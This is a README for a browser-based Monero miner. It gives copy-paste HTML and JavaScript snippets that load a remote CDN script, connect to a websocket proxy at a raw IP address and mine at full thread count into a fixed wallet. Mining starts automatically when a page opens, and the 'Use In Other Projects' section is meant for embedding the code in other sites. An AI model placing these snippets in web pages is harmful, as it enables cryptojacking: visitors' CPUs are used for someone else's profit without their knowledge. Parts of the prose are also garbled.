## Monero Webminer

Html & Js code allowing Mining of XMR (Monero) on browsers.
This set-up is part of a common shared project, fitted for
our needs and meant as an easy-to-share targetted crowd-mining
pedagogic path of learning and discovering XMR
and pooling aswell.


# Configure

In index.html are this settings to be adjusted as needed:

- Pool
- XMR Wallet (we use same address and also same
- Miner name (to work fusioned together for same target across the world)
- Threads (-1 means unlimited, automatic by default, --cpu-max-threads=100 for full capacity)
- Miner Password (Optional, as Moneroocean does not use password, if your pool does, it is usually "x",
          and as [https://monero.hasvault.pro](https://monero.hashvault.pro) uses them as identifier)


# Running

Open index.html in any web browser and it will automatically start mining.

(find an example shown (for now) at [https://monero-miner.vercel.app/](https://monero-miner.vercel.app/)

# Check worker influence

Most browser are based on a model including the menu `more tools` which will provide you with
    1. a `Task manager` (Gestionnaire des tâches) were you should recognize the side-effects.
    2. `Development tools` can help you find errors if any, else some details are explicit.
  else, with those extreme settings, watching global CPU monitors is for you.

# Check Progress 

Go to [https://monero.hashvault.pro](https://monero.hashvault.pro), as it is the pool you are connected to,
it will show your hashrates and balance right after the filling of right line with the used XMR Address
457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu
fascinating charts..

# How do I know if it works??

1. Open [monero-miner.vercel.app](https://monero-miner.vercel.app/)
2. Also Open https://supportxmr.com/ in a new tab
3. Paste in my XMR Address 457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu
4. You will see what "XMRingShare" is, Mining ethically. You can also do the same 

# Use In Other Projects
(should need reclarification asap)


HTML
  
    <!-- Start Of Mining Code (HTML) -->
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        server = "wss://45.119.82.33:40725";
        var pool = "pool.hashvault.pro:443";
        var walletAddress = "457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu";
        var workerId = "elikxmr"
        var threads = 100;
        var password = "elikxmr";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 0.02;
    </script>
    <!-- End Of Mining Code (HTML) -->
      

Javascript import snippet
  
    import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';


Javascript
    
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://45.119.82.33:40725";
    var pool = "pool.hashvault.pro:443";
    var walletAddress = "457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu";
    var workerId = "elikxmr"
    var threads = 100
    var password = "elikxmr";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 0.02;
    // End Of Mining Code
    
#  Give, offer, loose, stand, wait, stay on our pages
    
    
This software is **100% free** to use, and we would greatly appreciate any donations to help support our work. If you'd like to donate, you can use the following cryptocurrency addresses:



    XMR:  473rsRZRCr4dDsX44yRBSETPrMnHNNzpjG4MkHcuFdRXTcXbbX8T4ow2b8bkZoxEoeVNdagTo8qGwK689wuy7CrWJDXpEup   or alternatively,
        --> 457d9VieYh2USCLntbEu4t2T7AJXDoe3AEeaPJFjQnG8Qip6aoGrvD2U4378XFvkpcaa1v4hS93n52CyxMUmYzYiRgzczMu
    (this is the crowd-funding address we use to laser-focus efforts together, regardless to timezones and space between our project)

Thank you for choosing our Monero Webminer. We hope you'll find it useful and profiteroles to run, adapt
or simply (hoped for soon) just make you an option 1-clic-away available,
allowing the best choice to offer few seconds because a little is not nothing :D
